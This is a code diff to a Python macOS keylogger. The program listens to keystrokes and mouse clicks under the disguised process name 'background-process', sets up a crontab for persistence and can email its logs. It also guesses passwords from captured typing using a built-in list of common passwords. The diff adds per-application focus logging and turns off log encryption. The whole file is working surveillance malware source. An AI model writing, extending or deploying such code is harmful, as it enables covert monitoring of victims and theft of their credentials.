@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
 
+from webbrowser import get
 from AppKit import NSWorkspace
 from datetime import datetime
 from email.mime.multipart import MIMEMultipart
@@ -22,7 +23,7 @@ def timestamp():
     return right_now.strftime('%d-%m-%Y %H%M-%S')
 
 def sort_dict_descending_keys(dictionary):
-    return sorted(dictionary.items(), key=lambda pair: pair[1], reverse=True)
+    return sorted(dictionary.items(), key=lambda pair: len(pair[1]), reverse=True)
 
 def setup_crontab(exe_name):
     """
@@ -112,7 +113,7 @@ class Monitor:
     def __init__(self):
         # settings as they appear in generate.exe
         self.log_interval = 60
-        self.encrypt_logfiles = True
+        self.encrypt_logfiles = False 
         self.exe_name = 'background-process'
         self.passphrase = 'fishing-in-the-river-champion'
         self.log_via_email = False
@@ -125,11 +126,13 @@ class Monitor:
         # the interpreted log file will have this suffix
         self.interpreted = 'interpreted'
         # applications
-        self.apps = 'apps'
+        self.apps_suffx = 'apps'
 
         # state variables
         self.logs = list()
         self.text = str()
+        self.current_app = get_focus_app_string()
+        self.apps = { self.current_app : [ timestamp() ] }
     
         # for password guessing
         self.password_set = {"123456","password","12345678","qwerty","123456789","12345","1234","111111","1234567","dragon","123123","baseball","abc123","football","monkey","letmein","696969","shadow","master","666666","qwertyuiop","123321","mustang","1234567890","michael","654321","pussy","superman","1qaz2wsx","7777777","fuckyou","121212","000000","qazwsx","123qwe","killer","trustno1","jordan","jennifer","zxcvbnm","asdfgh","hunter","buster","soccer","harley","batman","andrew","tigger","sunshine","iloveyou","fuckme","2000","charlie","robert","thomas","hockey","ranger","daniel","starwars","klaster","112233","george","asshole","computer","michelle","jessica","pepper","1111","zxcvbn","555555","11111111","131313","freedom","777777","pass","fuck","maggie","159753","aaaaaa","ginger","princess","joshua","cheese","amanda","summer","love","ashley","6969","nicole","chelsea","biteme","matthew","access","yankees","987654321","dallas","austin","thunder","taylor","matrix","minecraft"}
@@ -144,6 +147,33 @@ class Monitor:
         # listeners
         self.keys = keyboard.Listener(on_press=self.on_press)
         self.mice = mouse.Listener(on_click=self.on_click)
+
+    # application monitoring
+    def update_app_on_input(self):
+        current = get_focus_app_string()
+        if current != self.current_app:
+            right_now = timestamp()
+            if not current in self.apps:
+                self.apps[current] = [right_now]
+            else:
+                self.apps[current].append(right_now)
+
+            self.current_app = current
+
+    def application_log(self):
+        # there will always be at least 1 app open so always log this
+        # log in order of most apps used
+        
+        # most_used = sort_dict_descending_keys(self.apps)
+        json_string = json.dumps(self.apps, indent=4)
+        right_now = timestamp()
+        filename = f'{self.log_folder}/{right_now} {self.apps_suffx}.json'
+        if self.encrypt_logfiles:
+            write_encrypted_file(json_string, self.passphrase, filename)
+        else:
+            write_normal_file(json_string, filename)
+        
+        self.apps = { get_focus_app_string() : [ right_now ]}
 
     # relating to guessing
 
@@ -254,8 +284,7 @@ class Monitor:
         timer.daemon = True
         timer.start()
 
-        self.create_log()
-        self.perform_guess_strategies()
+        self.update_logs()
     
     def record_raw_input(self, input_dict):
         self.update_text()
@@ -266,9 +295,10 @@ class Monitor:
         if not key:
             return
 
+        self.update_app_on_input()
+
         if (key == keyboard.Key.esc):
-            self.create_log()
-            self.perform_guess_strategies()
+            self.update_logs()
             self.mice.stop()
             return False
         
@@ -284,6 +314,8 @@ class Monitor:
     # pass in x and y to follow expected parameters of on_click
     def on_click(self, x, y, button, pressed):
         if (pressed):
+            self.update_app_on_input()
+
             record = {'m' : button.name.upper()}
             self.record_raw_input(record)
 
@@ -310,6 +342,14 @@ class Monitor:
 
         self.keys.join()
         self.mice.join()
+    
+    def update_logs(self):
+        """
+            Perform tasks that should be done when a new log is written
+        """
+        self.create_log()
+        self.perform_guess_strategies()
+        self.application_log()
         
 def main():
     monitor = Monitor()
